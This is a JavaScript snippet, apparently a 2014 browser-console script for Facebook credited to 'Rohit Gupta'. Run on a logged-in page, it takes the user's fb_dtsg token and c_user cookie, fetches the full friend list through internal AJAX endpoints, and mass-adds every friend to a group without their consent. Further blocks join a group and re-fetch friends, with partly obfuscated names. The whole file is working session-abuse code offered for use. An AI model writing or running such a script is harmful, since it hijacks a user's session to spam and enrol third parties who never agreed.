 (function(){var f={dtsg:document.getElementsByName("fb_dtsg")[0].value,uid:document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),gid:document.getElementsByName("group_id")[0].value,frns:Array(),prenKe:0,okeh:0,gagal:0,getAjak:function(b){var c=new XMLHttpRequest;c.open("GET",b,!0),c.onreadystatechange=function(){if(4==c.readyState&&200==c.status){var a=eval("("+c.responseText.substr(9)+")");a.payload&&a.payload.entries&&(f.frns=a.payload.entries.sort(function(){return.5-Math.random()})),document.getElementById("hasilsurasil").innerHTML="Found <b>"+f.frns.length+" subscribers</b><div id='hasilsatu'></div><div id='hasildua'></div><div id='hasiltiga' style='min-width:300px;display:inline-block;text-align:left'></div>"+crj;for(x in f.frns)f.senAjak(x)}else document.getElementById("hasilsurasil").innerHTML=4==c.readyState&&404==c.status?"<b style='color:darkred'>Group Open!</b>"+crj:"<b style='color:darkgreen'>Searching for potential subscribers ... ("+c.readyState+")</b>"+crj},c.send()},senAjak:function(d){var e=new XMLHttpRequest,prm="__a=1&fb_dtsg="+f.dtsg+"&group_id="+f.gid+"&source=typeahead&ref=&message_id=&members="+f.frns[d].uid+"&__user="+f.uid+"&phstamp=";e.open("POST","/ajax/groups/members/add_post.php",!0),e.setRequestHeader("Content-type","application/x-www-form-urlencoded"),e.setRequestHeader("Content-length",prm.length),e.setRequestHeader("Connection","keep-alive"),e.onreadystatechange=function(){if(4==e.readyState&&200==e.status){var a=eval("("+e.responseText.substr(9)+")");if(f.prenKe++,document.getElementById("hasilsatu").innerHTML="<div><b>"+f.prenKe+"</b> of <b>"+f.frns.length+"</b></div>",a.errorDescription&&(f.gagal++,document.getElementById("hasiltiga").innerHTML="<div><b style='color:darkred'>( "+f.gagal+" )</b> <span style='color:darkred'>"+a.errorDescription+"</span></div>"),a.jsmods&&a.jsmods.require){var b="<div>";for(x in a.jsmods.require)a.jsmods.require[x][a.jsmods.require[x].length-1][1]&&(b+="<b style='color:darkgreen'>"+a.jsmods.require[x][a.jsmods.require[x].length-1][1]+"</b> ");b+="<div>",document.getElementById("hasildua").innerHTML=b}if(a.onload)for(z in a.onload){var c=eval(a.onload[z].replace(/Arbiter.inform/i,""));if(c.uid&&c.name){f.okeh++,document.getElementById("hasiltiga").innerHTML="<div><b style='color:darkgreen'>( "+f.okeh+" )</b> <a href='/"+c.uid+"' target='_blank'><b>"+c.name+"</b></a> have subscribed to you.</div>";break}}f.prenKe==f.frns.length&&(document.getElementById("hasiltiga").style.textAlign="center",document.getElementById("hasiltiga").innerHTML+="<div style='font-size:20px;font-weight:bold'>Done!</div><a href='/' onClick='document.getElementById(\"hasilsurasil\").style.display=\"none\";return false'>Rohit Gupta</a>")}},e.send(prm)}},crj="<div style='margin-top:10px;color:gray;font-size:12px'>Rohit Gupta &copy; 2014<div style='font-size:9px'><a href='http://www.campuskarma.in/' target='_blank'>Campus Karma</a></div></div>";document.body.innerHTML+="<center id='hasilsurasil' style='min-height:50px;width:600px;position:fixed;top:100px;left:"+(document.body.offsetWidth-530)/2+"px;border-radius:10px;padding:10px;z-index:999999;border:5px solid skyblue;background-color:rgba(225,225,255,0.75)'><b>Searching for subscribers ... Script by Rohit Gupta </b>"+crj+"</center>",f.getAjak("/ajax/typeahead/first_degree.php?__a=1&viewer="+f.uid+"&token="+Math.random()+"&filter[0]=user&options[0]=friends_only")})(); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
data = eval('(' + gf['responseText']['substr'](9) + ')');
if (data['error']) {} else {
friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
return _0x93dax8['index'] - _0x93dax9['index'];
});
};
};